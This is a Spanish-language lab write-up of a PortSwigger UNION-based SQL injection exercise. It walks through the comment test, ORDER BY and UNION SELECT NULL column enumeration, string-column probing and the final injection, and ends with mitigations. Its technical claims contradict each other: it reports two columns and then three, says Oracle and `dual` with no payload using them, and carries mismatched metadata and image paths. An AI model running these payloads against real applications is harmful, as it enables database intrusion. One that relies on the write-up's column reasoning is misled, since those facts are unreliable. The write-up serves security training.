---
title: "Ataque UNION de inyección SQL, búsqueda de una columna que contiene texto"
platform: "PortSwigger"
os: "Windows"
difficulty: "Easy"
ip: "10.10.10.XXX"
slug: "ataque-union-de-inyeccion-sql-busqueda-de-una-columna-que-contiene-texto"
author: "Z4k7"
date: "2026-03-11"
year: "2026"
status: "pwned"
tags:
  - "SQLi"
  - "UnionAttack"
  - "Database"
  - "OracleDB"
  - "WAF"
techniques:
  - "SQLi"
  - "UnionAttack"
  - "Database"
  - "OracleDB"
  - "WAF"
tools:
  - "Burpsuite"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "La vulnerabilidad de SQL Injection (SQLi) ocurre cuando una aplicación web construye  consultas SQL dinámicas sin sanitizar adecuadamente la entrada del usuario. En este  laboratorio, el filtro de categorías de producto es vulnerable, permitiendo manipular la  consulta y usar un ataque UNION SELECT para recuperar datos de otras tablas. El ataque UNION funciona porque el motor SQL combina resultados de múltiples consultas  siempre que tengan el mismo número y tipo de columnas."
steps:

  - id: "exploit"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categorías de producto. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que se puede usar un ataque UNION para recuperar datos de otras tablas. Para construir dicho ataque, primero se debe determinar el número de columnas devueltas por la consulta.
          El laboratorio proporcionará un valor aleatorio que deberá incluir en los resultados de la consulta. Para resolverlo, realice un ataque de inyección `SQL UNION` que devuelva una fila adicional con el valor proporcionado. Esta técnica le ayudará a determinar qué columnas son compatibles con datos de cadena.

  - id: "recon"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Prueba inicial con `'--` confirma la inyección:
      - kind: "code"
        lang: "SQL"
        code: |
          '--
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyección%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311142644931.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "La aplicación no valida correctamente la entrada y acepta el comentario SQL, confirmando la inyección"
      - kind: "note"
        text: |
          Enumeración de columnas con `ORDER BY`:
      - kind: "code"
        lang: "SQL"
        code: |
          '+ORDER+BY+1,2-- -- Éxito 
          '+ORDER+BY+1,2,3-- -- Erro
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyección%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311142730399.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "El fallo confirma que la consulta devuelve 2 columnas."

  - id: "exploit"
    num: "03"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Validación con `UNION SELECT` en Oracle usando `dual`:
      - kind: "code"
        lang: "SQL"
        code: |
          UNION SELECT NULL--   -- Error
          UNION SELECT NULL,NULL--   -- Error
          UNION SELECT NULL,NULL,NULL--   -- Éxito
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyección%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311144035966.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "Se confirma que la consulta requiere 2 columnas para que el `UNION` sea válido."
      - kind: "note"
        text: |
          Prueba de compatibilidad con datos de cadena:
      - kind: "code"
        lang: "SQL"
        code: |
          UNION SELECT 'a',NULL,NULL-- -- Error 
          UNION SELECT NULL,'a',NULL-- -- Éxito 
          UNION SELECT NULL,NULL,'a'-- -- Error
      - kind: "image"
        src: "assets/images/Ataque%20UNION%20de%20inyección%20SQL,%20búsqueda%20de%20una%20columna%20que%20contiene%20texto/file-20260311145957817.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "La columna 2 acepta datos de tipo cadena."
      - kind: "note"
        text: |
          Extracción de columnas de la tabla:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT NULL,'g2O5kP',NULL--
      - kind: "image"
        src: "assets/images/Ataque%20UNION%20de%20inyección%20SQL,%20búsqueda%20de%20una%20columna%20que%20contiene%20texto/file-20260311150109385.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "El string `g2O5kP` aparece en la respuesta de la aplicación, completando el laboratorio."

  - id: "step4"
    num: "04"
    title: "Informacion"
    content:
      - kind: "note"
        text: |
          Cuando se realiza un ataque `UNION` de inyección SQL, hay dos métodos efectivos para determinar cuántas columnas se devuelven de la consulta original.
          `ORDER BY` y `UNION SELECT`
          Para aplicar el primer método de  la inyección aplicando la palabra clave `ORDER BY` de eta manera se podría calcular las columnas disponibles  Por ejemplo, si el punto de inyección es una cadena entre comillas dentro de la `WHERE`cláusula de la consulta original, enviarías:
      - kind: "code"
        lang: "SQL"
        code: |
          ' ORDER BY 1-- 
          ' ORDER BY 2-- 
          ' ORDER BY 3-- 
          etc.
      - kind: "note"
        text: |
          Par validar que real mente se a capturado o calculado la cantidad de columnas disponibles en la BD ,la base de datos devuelve un error, como el siguiente
          Validación con UNION SELECT
          Se prueban combinaciones con `NULL` para ajustar el número de columnas:
      - kind: "code"
        lang: "SQL"
        code: |
          UNION SELECT NULL--   -- Error
          UNION SELECT NULL,NULL--   -- Error
          UNION SELECT NULL,NULL,NULL--   -- Éxito
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "La consulta con tres valores `NULL` se ejecuta correctamente, confirmando que la tabla devuelve 3 columnas."
      - kind: "note"
        text: |
          El segundo método implica presentar una serie de `UNION SELECT`cargas útiles que especifican un número diferente de valores nulos:
      - kind: "code"
        lang: "SQL"
        code: |
          UNION SELECT NULL-- 
           UNION SELECT NULL,NULL-- 
           UNION SELECT NULL,NULL,NULL--
      - kind: "note"
        text: |
          En este caso el lo contrario no es validar el error sino salir del erro cada vez que agregas un null se espera escapara del siguiente error.
      - kind: "callout"
        type: "danger"
        label: "SQL ERROR"
        text: "All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists."

lessons:
  - 'El uso de `NULL` es una técnica estándar para evitar conflictos de tipos.'
  - 'En auditorías, documentar cada paso con evidencia visual y técnica.'
  - 'Para exámenes, recordar que ORDER BY y UNION SELECT son métodos complementarios para descubrir la estructura de la consulta.'
mitigation:
  - 'Implementar prepared statements (parametrización).'
  - 'Validar y sanitizar entradas de usuario.'
  - 'Configurar #WAF para detectar patrones de SQLi.'
  - 'Minimizar mensajes de error expuestos al cliente.'
  - 'Revisar logs de base de datos para detectar consultas anómalas.'
---
